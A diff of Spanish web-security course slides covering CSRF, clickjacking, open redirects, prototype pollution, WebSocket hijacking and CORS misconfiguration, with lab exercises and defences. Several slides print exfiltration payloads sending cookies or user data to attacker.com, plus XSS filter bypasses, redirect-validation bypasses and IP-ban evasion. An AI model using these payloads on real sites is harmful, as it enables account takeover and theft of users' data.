+\begin{frame}[allowframebreaks]{Realiza un ataque XSS almacenado con un CSRF en DVWA}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl137_1.jpg}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CSRF}
+\small
+  \begin{itemize}
+  \item CSRF e Ingeniería Social:
+    \begin{itemize}
+    \item La idea es crear una web falsa que incorpore en payload del ataque CSRF.
+    \item Con esto, sólo sería necesario engañar a la víctima para que visite esa web falsa, mientras está autenticada en DVWA.
+    \item Pro ejemplo:
+    \end{itemize}
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl138_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CSRF}
+\small
+  \begin{itemize}
+  \item CSRF e Ingeniería Social:
+    \begin{itemize}
+    \item En el propio Kali, puedes levantar el servicio web con la web falsa
+      \begin{itemize}
+      \item sudo service apache2 start
+      \item y colgar la web en el /var/www/html
+      \end{itemize}
+    \end{itemize}
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl139_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CSRF}
+\small
+  \begin{itemize}
+  \item CSRF e Ingeniería Social:
+    \begin{itemize}
+    \item También se puede hacer mediante un mail con un hipervínculo
+    \end{itemize}
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl140_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CSRF}
+\small
+  \begin{itemize}
+  \item CSRF con curl:
+  \item Si el usuario está autenticado en DVWA y conseguidnos su cookie de sesión, podemos cambiarle su password sin que se entere explotando la vulnerabilidad CSRF mediante la herramienta curl
+  \item Para evitar ataques CSRF hay que asegurarse que una acción está realmente siendo llevada a cabo por el usuario en lugar de un tercero (navegador), para ello, hay que asociarlo con algún tipo de identificador único que puede ser verificado después, llamado token.
+  \item Vulnerabilidades Web
+  \end{itemize}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl141_1.png}
+\end{center}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{Ejercicio}
+\small
+  \begin{itemize}
+  \item Serías capaz de hacer un robo de cuenta de usuario explotando una vulnerabilidad CSRF e inyectándola vía XSS en la aplicación bWAPP y en DVWA
+  \item Soluciones
+  \end{itemize}
+\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_1.jpg}
+\end{center}
+\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_2.png}
+\end{center}
+\begin{center}\includegraphics[width=0.62\textwidth,height=0.42\textheight,keepaspectratio]{img/sl142_3.png}
+\end{center}
+\end{frame}
+
+\subsection{Laboratorios (PortSwigger Academy)}
+
 
 \begin{frame}[allowframebreaks]{Cross-Site Request Forgery (CSRF) --- Introducción}
 \small
@@ -2601,7 +2179,40 @@ headers:\{'Content-Type':'application/x-www-form-urlencoded'\}\})\\{}
   \end{itemize}
 \end{frame}
 
-\section{Clickjacking --- PortSwigger Academy}
+\begin{frame}{Referencias y práctica --- CSRF}
+\footnotesize
+  \begin{itemize}
+  \item \href{https://portswigger.net/web-security/csrf}{PortSwigger --- CSRF} (labs)
+  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html}{OWASP --- CSRF Prevention Cheat Sheet}
+  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite}{MDN --- SameSite cookies}
+  \end{itemize}
+\end{frame}
+
+\section{Clickjacking}
+\subsection{Fundamentos}
+
+
+\begin{frame}[allowframebreaks]{Clickjacking}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{Clickjacking}
+\small
+  \begin{itemize}
+  \item Este ataque consiste en superponer una capa transparente en la interfaz de una aplicación web.
+  \item Esto permite al atacante engañar al usuario, que realiza acciones indeseadas sin percatarse.
+  \item La forma de realizar este ataque puede ser parecida a un XSS, podemos inyectar código html o un evento indeseado para el usuario.
+  \item En ciertas aplicaciones como las bancarias, este ataque puede ser terriblemente peligroso.
+  \item Vulnerabilidades Web
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{Realiza un ataque clickjacking en la web DVWA}
+\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl149_1.jpg}
+\end{center}
+\end{frame}
+
+\subsection{Laboratorios (PortSwigger Academy)}
+
 
 \begin{frame}[allowframebreaks]{Clickjacking --- Introducción}
 \small
@@ -2673,6 +2284,404 @@ headers:\{'Content-Type':'application/x-www-form-urlencoded'\}\})\\{}
   \item CSP frame-ancestors es más flexible y tiene precedencia sobre X-Frame-Options
   \item Clickjacking requiere que la acción sea visible en un iframe (sin framebusting)
   \item portswigger.net/web-security/all-labs\#clickjacking
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Referencias y práctica --- Clickjacking}
+\footnotesize
+  \begin{itemize}
+  \item \href{https://portswigger.net/web-security/clickjacking}{PortSwigger --- Clickjacking} (labs)
+  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html}{OWASP --- Clickjacking Defense Cheat Sheet}
+  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options}{MDN --- X-Frame-Options y frame-ancestors}
+  \end{itemize}
+\end{frame}
+
+\section{Open Redirect}
+
+\begin{frame}[allowframebreaks]{Open Redirect --- Fundamentos}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item ¿Qué es un Open Redirect?
+  \item La app acepta una URL como parámetro y redirige al usuario a ella sin validar
+  \item si el destino es legítimo. El atacante usa el dominio de confianza como gancho.
+  \item Ejemplo básico
+  \item https://banco.com/redirect?url=https://bank0.com/phishing
+  \item $\rightarrow$ El servidor responde: 302 Location: https://bank0.com/phishing
+  \item $\rightarrow$ La víctima ve 'banco.com' en el link $\rightarrow$ confía y hace clic
+  \item Parámetros habituales de redirección
+  \item ?url= ?next= ?redirect= ?return= ?goto= ?dest= ?target=
+  \item Cabecera Referer en respuestas de logout/login
+  \item $\rightarrow$ Buscar con: ffuf -w params.txt -u 'https://victima.com/?FUZZ=https://test.com'
+  \item Impacto
+  \item Phishing: link parece legítimo (dominio real de confianza)
+  \item Robo de tokens OAuth: redirect\_uri puede apuntar al atacante
+  \item Encadenamiento con SSRF para redirigir peticiones internas
+  \item Herramienta: Oralyzer
+  \item pip install oralyzer
+  \item oralyzer -u 'https://victima.com/redir?next=FUZZ'
+  \item OWASP: owasp.org/www-project-web-security-testing-guide (OTG-CLIENT-004)
+  \item Más: linkedin/deepmarketer --- Exploiting Open Redirection
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{Open Redirect --- Bypass y encadenamiento con OAuth}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item Bypass de validaciones basadas en startswith/contains
+  \item[] \cmdbox{Si la app valida que la URL empiece por el dominio legítimo:}
+  \item https://victima.com.attacker.com (subdominio del atacante)
+  \item https://victima.com@attacker.com (@ separa user:pass del host)
+  \item //attacker.com (protocol-relative URL)
+  \item /\textbackslash\{\}attacker.com (backslash normalizado por browsers)
+  \item Bypass con codificación
+  \item \%2F\%2Fattacker.com (doble slash URL-encoded)
+  \item https://attacker\%2Ecom (punto URL-encoded)
+  \item https://attacker\textbackslash\{\}.com (backslash confunde parsers)
+  \item Account Takeover vía OAuth + Open Redirect
+  \item[] \cmdbox{Si el servidor OAuth valida redirect\_uri como 'startswith':}
+  \item GET /oauth/authorize?client\_id=X
+  \item \&redirect\_uri=https://victima.com/cb/../../../attacker.com
+  \item $\rightarrow$ Path traversal en la URL $\rightarrow$ el authorization code llega al atacante
+  \item $\rightarrow$ El atacante canjea el code por access\_token $\rightarrow$ Account Takeover
+  \item Encadenamiento con XSS (javascript: protocol)
+  \item ?url=javascript:fetch('https://attacker.com/?c='+document.cookie)
+  \item $\rightarrow$ Solo en clientes que ejecutan javascript: en location (raro en navegadores modernos)
+  \item Severidad: Media sola --- Crítica encadenada con OAuth o XSS
+  \item portswigger.net/web-security/oauth (open redirect + OAuth account takeover)
+  \item Automatizar la búsqueda: Oralyzer
+  \item Script en Python que prueba Open Redirect
+  \item fuzzeando el parámetro vulnerable de la URL.
+  \item Detecta además CRLF injection.
+  \item Instalación
+  \item git clone github.com/r0075h3ll/Oralyzer
+  \item pip3 install -r requirements.txt
+  \item Uso
+  \item python3 oralyzer.py -u 'http://site/?url=FUZZ'
+  \item python3 oralyzer.py -l urls.txt (lista)
+  \item Módulo web.archive.org: recolecta URLs con
+  \item parámetros sospechosos (?url= ?next=\dots{}) y las prueba.
+  \item github.com/r0075h3ll/Oralyzer
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Referencias y práctica --- Open Redirect}
+\footnotesize
+  \begin{itemize}
+  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html}{OWASP --- Unvalidated Redirects Cheat Sheet}
+  \item \href{https://portswigger.net/kb/issues/00500100_open-redirection-reflected}{PortSwigger --- Open Redirection}
+  \end{itemize}
+\end{frame}
+
+\section{Prototype Pollution}
+
+\begin{frame}[allowframebreaks]{Prototype Pollution}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item ¿Qué es?
+  \item El atacante modifica Object.prototype en JavaScript. Como TODOS
+  \item los objetos heredan de él, el cambio afecta a TODA la app.
+  \item obj.\_\_proto\_\_.isAdmin = true $\cdot$ \{\textquotedbl{}\_\_proto\_\_\textquotedbl{}:\{\textquotedbl{}isAdmin\textquotedbl{}:true\}\}
+  \item Impacto (muy alto)
+  \item Escalada de privilegios (inyectar isAdmin:true).
+  \item Bypass de validaciones (if(obj.authenticated)).
+  \item Cambiar comportamientos internos (getters/setters).
+  \item Denial of Service.
+  \item Dónde
+  \item Client-side (DOM) y server-side (Node.js); encadena a XSS/RCE
+  \item según los 'gadgets' disponibles.
+  \item PortSwigger Prototype Pollution
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{Prototype Pollution --- lado cliente}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item Fuentes (sources) en el navegador
+  \item ?\_\_proto\_\_[gadget]=payload (desde location.hash/search $\rightarrow$ merge)
+  \item URL, JSON.parse y merges recursivos que copian claves del usuario a Object.prototype.
+  \item XSS en el DOM por pollution
+  \item ?\_\_proto\_\_[hitCallback]=alert(document.cookie)
+  \item Se contamina un gadget (config, callback, src) que un script del cliente usa sin comprobar $\rightarrow$ XSS DOM.
+  \item Vectores alternativos y bypass de sanitización
+  \item constructor[prototype][x] $\cdot$ \_\_pro\_\_proto\_\_to\_\_ (no recursivo)
+  \item Si bloquean \_\_proto\_\_, usar constructor.prototype; si la sanitización no es recursiva, se reconstruye (como path traversal).
+  \item DOM Invader (Burp) automatiza sources/sinks/gadgets $\cdot$ hack4u.io
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{Prototype Pollution --- libs de terceros}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item Librerías vulnerables clásicas
+  \item lodash \_.merge/\_.set $\cdot$ jQuery \$.extend(true,\dots{}) $\cdot$ minimist, deep-merge
+  \item Funciones de merge/clone recursivas que no filtran \_\_proto\_\_ $\rightarrow$ el gadget está en la propia librería.
+  \item Encontrar el gadget (source $\rightarrow$ sink)
+  \item Contaminar una propiedad y ver si la librería la lee para construir HTML, opciones o comandos.
+  \item Ejemplo (client-side)
+  \item \$.extend(true, \{\}, JSON.parse(location.hash.slice(1)))
+  \item Un \$.extend profundo con datos de la URL $\rightarrow$ pollution directa.
+  \item Defensa: actualizar la librería, Object.create(null) o Map; congelar Object.prototype.
+  \item Técnicas del curso hack4u.io
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Referencias y práctica --- Prototype Pollution}
+\footnotesize
+  \begin{itemize}
+  \item \href{https://portswigger.net/web-security/prototype-pollution}{PortSwigger --- Prototype Pollution} (labs)
+  \item \href{https://github.com/BlackFan/client-side-prototype-pollution}{BlackFan --- Client-side Prototype Pollution (gadgets)}
+  \end{itemize}
+\end{frame}
+
+\section{WebSockets}
+
+\begin{frame}[allowframebreaks]{WebSockets --- Pentesting}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item Fundamentos y handshake
+  \item CSWSH (CSRF en WebSockets)
+  \item Interceptación y manipulación
+  \item Otras vulnerabilidades y defensa
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{WebSockets --- Pentesting y vulnerabilidades}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item ¿Qué son los WebSockets?
+  \item Protocolo full-duplex sobre TCP: mantiene una conexión persistente
+  \item entre cliente y servidor. Usado en chats, dashboards, notificaciones, juegos.
+  \item Handshake de apertura WebSocket
+  \item[] \cmdbox{El cliente envía (HTTP Upgrade):}
+  \item GET /chat HTTP/1.1
+  \item Upgrade: websocket
+  \item Connection: Upgrade
+  \item Sec-WebSocket-Key: BASE64\_RANDOM==
+  \item[] \cmdbox{El servidor confirma: 101 Switching Protocols\\{}
+A partir de aquí: comunicación binaria bidireccional}
+  \item Interceptar WebSockets con Burp Suite
+  \item Proxy $\rightarrow$ WebSockets History: muestra todos los mensajes WS enviados/recibidos
+  \item Clic derecho en un mensaje $\rightarrow$ Send to Repeater
+  \item Modificar y reenviar mensajes WS manualmente en tiempo real
+  \item Vulnerabilidades comunes en WebSockets
+  \item Inyección (XSS, SQLi, CMDi) en mensajes WS sin sanitizar
+  \item Falta de autenticación en el handshake (cualquiera puede conectarse)
+  \item Ausencia de cifrado (ws:// en vez de wss:// $\rightarrow$ tráfico en claro)
+  \item Cross-Site WebSocket Hijacking (CSWSH) $\rightarrow$ ver siguiente diapositiva
+  \item portswigger.net/web-security/websockets
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{WebSockets --- Cross-Site WebSocket Hijacking (CSWSH)}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item ¿Qué es CSWSH?
+  \item Equivalente a CSRF para WebSockets: el atacante abre una conexión WS
+  \item en nombre de la víctima desde un dominio malicioso.
+  \item Condiciones para que sea explotable
+  \item 1. El handshake NO incluye un token CSRF
+  \item 2. El servidor autentica usando solo las cookies de sesión
+  \item 3. El servidor no valida el header Origin del handshake
+  \item Payload CSWSH (página del atacante)
+  \item \textbf{HTML en el servidor del atacante:}
+  \item \textless{}script\textgreater{}
+  \item var ws = new WebSocket('wss://victima.com/chat');
+  \item ws.onopen = () =\textgreater{} ws.send(JSON.stringify(\{action:'get\_history'\}));
+  \item ws.onmessage = e =\textgreater{} fetch('https://attacker.com/?d='+btoa(e.data));
+  \item \textless{}/script\textgreater{}
+  \item $\rightarrow$ La víctima visita la página del atacante
+  \item $\rightarrow$ Su navegador abre una WS connection autenticada con las cookies de victima.com
+  \item $\rightarrow$ El historial de chat se exfiltra al servidor del atacante
+  \item Medidas de protección
+  \item Validar el header Origin en el handshake del servidor WS
+  \item Incluir un token CSRF como parámetro en la URL del handshake
+  \item Usar tokens de sesión en el primer mensaje WS, no solo cookies
+  \item portswigger.net/web-security/websockets/cross-site-websocket-hijacking
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{WebSockets --- Interceptación y manipulación}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item Interceptar el tráfico WS
+  \item Burp: pestaña 'WebSockets history' $\rightarrow$ interceptar y editar
+  \item mensajes en tiempo real (Repeater para WS).
+  \item Probar downgrade: ¿acepta ws:// (texto plano) en vez de wss://?
+  \item Manipular mensajes = inyectar
+  \item Cada mensaje es entrada del usuario $\rightarrow$ mismas inyecciones:
+  \item \{\textquotedbl{}message\textquotedbl{}:\textquotedbl{}\textless{}img src=x onerror=alert(1)\textgreater{}\textquotedbl{}\} $\rightarrow$ XSS
+  \item \{\textquotedbl{}id\textquotedbl{}:\textquotedbl{}1 OR 1=1\textquotedbl{}\} $\rightarrow$ SQLi $\cdot$ XXE en payloads XML
+  \item Herramientas
+  \item Burp (WS history) $\cdot$ wsrepl $\cdot$ websocat $\cdot$ OWASP ZAP
+  \item cobalt.io --- A Pentester's Guide to WebSocket Pentesting
+  \item Mensaje WS legítimo
+  \item \{\textquotedbl{}message\textquotedbl{}:\textquotedbl{}hola\textquotedbl{}\}
+  \item Burp intercepta y edita
+  \item \{\textquotedbl{}message\textquotedbl{}:\textquotedbl{}\textless{}img onerror\textgreater{}\textquotedbl{}\}
+  \item Servidor sin validar $\rightarrow$ XSS
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{WebSockets --- Manipulación del handshake}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item ¿Qué es?
+  \item Modificar las cabeceras del handshake de apertura (HTTP Upgrade) para saltarse defensas del servidor durante un ataque por WebSocket.
+  \item Bypass de bloqueo por IP con X-Forwarded-For
+  \item GET /chat HTTP/1.1 Upgrade: websocket Connection: Upgrade X-Forwarded-For: 1.2.3.4
+  \item Si el servidor banea tu IP al detectar un ataque (p.ej. XSS por mensaje), añadir/rotar X-Forwarded-For en el handshake resetea el bloqueo.
+  \item Ofuscar el payload para el filtro XSS
+  \item \textless{}img src=1 oNeRRor=alert(document.cookie)\textgreater{}
+  \item Se combina con la manipulación de mensajes: ofuscar el payload (mayúsculas, encoding, atributos raros) para pasar el filtro del servidor.
+  \item Flujo típico (lab PortSwigger)
+  \item 1) Interceptar el handshake en Burp. 2) Reenviarlo con X-Forwarded-For falsificado. 3) Enviar el mensaje WS con el XSS ofuscado $\rightarrow$ se ejecuta.
+  \item Fuente: curso Hacking Web $\cdot$ hack4u.io $\cdot$ cf. PortSwigger WebSockets
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{WebSockets --- Otras vulnerabilidades y defensa}
+\small
+  \begin{itemize}
+  \item Vulnerabilidades Web
+  \item Comunicaciones sin cifrar (ws://)
+  \item ws:// viaja en claro $\rightarrow$ MitM, robo de tokens y datos sensibles.
+  \item Denial of Service
+  \item Abrir muchas conexiones o mensajes masivos sin límite $\rightarrow$ DoS.
+  \item Exposición de información sensible
+  \item Tokens y datos personales en los mensajes WS sin protección.
+  \item Defensa (remediation)
+  \item Usar wss:// (TLS); validar el header Origin en el handshake;
+  \item token CSRF en el handshake (anti-CSWSH); validar/sanear TODO
+  \item mensaje; autenticar por mensaje; límites de conexión y ritmo.
+  \item Trata cada mensaje WS como entrada NO confiable.
+  \item cobalt.io $\cdot$ portswigger.net/web-security/websockets
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Referencias y práctica --- WebSockets}
+\footnotesize
+  \begin{itemize}
+  \item \href{https://portswigger.net/web-security/websockets}{PortSwigger --- WebSockets security} (labs)
+  \item \href{https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html}{OWASP --- HTML5 / WebSockets Security}
+  \end{itemize}
+\end{frame}
+
+\section{CORS}
+
+\begin{frame}[allowframebreaks]{CORS --- Compartición de Recursos entre Orígenes}
+\small
+  \begin{itemize}
+  \item CORS
+  \item ¿Qué es CORS y por qué existe?
+  \item La Same-Origin Policy (SOP) impide que JS de origin-A lea respuestas de origin-B.
+  \item CORS (Cross-Origin Resource Sharing) es el mecanismo que RELAJA esa restricción
+  \item de forma controlada mediante cabeceras HTTP.
+  \item Cabeceras clave
+  \item Access-Control-Allow-Origin: https://trusted.com $\rightarrow$ quién puede leer la respuesta
+  \item Access-Control-Allow-Credentials: true $\rightarrow$ se incluyen cookies/auth
+  \item Access-Control-Allow-Methods / Headers $\rightarrow$ métodos y cabeceras permitidos
+  \item $\rightarrow$ El navegador hace un preflight OPTIONS antes de peticiones no simples.
+  \item Petición simple vs Preflight
+  \item Simple: GET/POST con Content-Type estándar $\rightarrow$ navegador añade Origin y espera ACAO.
+  \item Preflight: PUT, DELETE, cabeceras custom $\rightarrow$ OPTIONS primero, luego la petición real.
+  \item ¿Cuándo hay vulnerabilidad?
+  \item El servidor configura ACAO de forma demasiado permisiva (refleja el Origin, usa *, permite null).
+  \item Si además permite credenciales $\rightarrow$ el atacante puede leer datos autenticados del usuario.
+  \item CORS mal configurado $\neq$ CSRF. CORS permite LEER la respuesta; CSRF ejecuta acciones.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CORS --- Reflexión del Origen (Labs 92-93)}
+\small
+  \begin{itemize}
+  \item CORS
+  \item Vulnerabilidad --- Reflexión del origen sin validación (Labs 92-93)
+  \item El servidor toma el valor del header Origin de la petición y lo devuelve tal cual en ACAO.
+  \item Resultado: cualquier origen puede leer la respuesta, incluidos datos sensibles.
+  \item \textbf{Petición del atacante:}
+  \item \cmd{Origin: https://attacker.com}
+  \item \textbf{Respuesta del servidor vulnerable:}
+  \item \cmd{Access-Control-Allow-Origin: https://attacker.com}
+  \item \cmd{Access-Control-Allow-Credentials: true}
+  \item Código del ataque (Lab 92)
+  \item \cmd{fetch('https://victim.com/api/userdata', \{}
+  \item \cmd{credentials: 'include'}
+  \item \cmd{\}).then(r =\textgreater{} r.json()).then(data =\textgreater{} \{}
+  \item \cmd{fetch('https://attacker.com/log?d=' + JSON.stringify(data));}
+  \item \cmd{\});}
+  \item $\rightarrow$ La víctima ejecuta este JS (via XSS o página controlada por atacante).
+  \item $\rightarrow$ credentials:include envía las cookies $\rightarrow$ respuesta incluye datos privados.
+  \item Lab 93 --- ACAO con wildcard y credenciales
+  \item Access-Control-Allow-Origin: * con Allow-Credentials: true $\rightarrow$ combinación inválida
+  \item $\rightarrow$ Los navegadores rechazan esta combinación, pero algunos servidores la configuran mal.
+  \item Un servidor que refleja el Origin es equivalente a ACAO: * para el atacante.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CORS --- Origen null y Protocolos Inseguros}
+\small
+  \begin{itemize}
+  \item CORS
+  \item Lab 94 --- Origen null en la whitelist
+  \item El header Origin vale 'null' en: iframes sandbox, data: URLs, file:// y redirects cross-origin.
+  \item Si el servidor confía en null: Access-Control-Allow-Origin: null
+  \item El atacante usa un iframe sandbox para generar Origin: null y leer la respuesta:
+  \item \cmd{\textless{}iframe sandbox='allow-scripts allow-top-navigation allow-forms'}
+  \item \cmd{srcdoc=\textquotedbl{}\textless{}script\textgreater{}}
+  \item \cmd{fetch('https://victim.com/api/data', \{credentials:'include'\})}
+  \item \cmd{.then(r=\textgreater{}r.text()).then(d=\textgreater{}location='https://attacker.com/?d='+d);}
+  \item \cmd{\textless{}/script\textgreater{}\textquotedbl{}\textgreater{}}
+  \item \cmd{\textless{}/iframe\textgreater{}}
+  \item Labs 95-96 --- Protocolo inseguro en la whitelist
+  \item El servidor confía en http://trusted.com (HTTP, sin TLS).
+  \item El atacante en posición MITM intercepta la petición HTTP a trusted.com
+  \item e inyecta una respuesta con el payload CORS.
+  \item Resultado: el navegador cree que la petición viene de un origen confiable.
+  \item $\rightarrow$ Subdominios HTTP de la whitelist son un vector frecuente en entornos reales.
+  \item Nunca incluir 'null' ni URLs http:// en la whitelist de CORS.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{CORS --- Defensa y Configuración Segura}
+\small
+  \begin{itemize}
+  \item CORS
+  \item Configuración segura de CORS
+  \item Whitelist explícita y estática de orígenes de confianza:
+  \item \cmd{if (request.origin in ALLOWED\_ORIGINS):}
+  \item \cmd{response['Access-Control-Allow-Origin'] = request.origin}
+  \item Nunca reflejar el valor de Origin directamente sin validar.
+  \item Nunca poner null en la whitelist.
+  \item Solo usar http:// si la conexión es interna y controlada.
+  \item Reglas sobre credenciales
+  \item Allow-Credentials: true SOLO con un ACAO específico (nunca con *).
+  \item Si no necesitas credenciales cross-origin $\rightarrow$ no habilites Allow-Credentials.
+  \item Cabecera Vary: Origin
+  \item Añadir Vary: Origin para que los proxies cacheen por origen.
+  \item $\rightarrow$ Sin esto, un proxy puede devolver la respuesta CORS de otro origen.
+  \item No usar CORS como control de acceso
+  \item CORS es un mecanismo del NAVEGADOR --- no protege peticiones server-to-server.
+  \item Las APIs deben autenticar y autorizar cada petición independientemente.
+  \item Combinar con: autenticación robusta + tokens CSRF + SameSite=Strict.
+  \item Una configuración CORS laxa + credenciales = exfiltración de datos autenticados.
+  \end{itemize}
+\end{frame}
+
+\begin{frame}{Referencias y práctica --- CORS}
+\footnotesize
+  \begin{itemize}
+  \item \href{https://portswigger.net/web-security/cors}{PortSwigger --- CORS} (labs)
+  \item \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS}{MDN --- Cross-Origin Resource Sharing}
   \end{itemize}
 \end{frame}
 
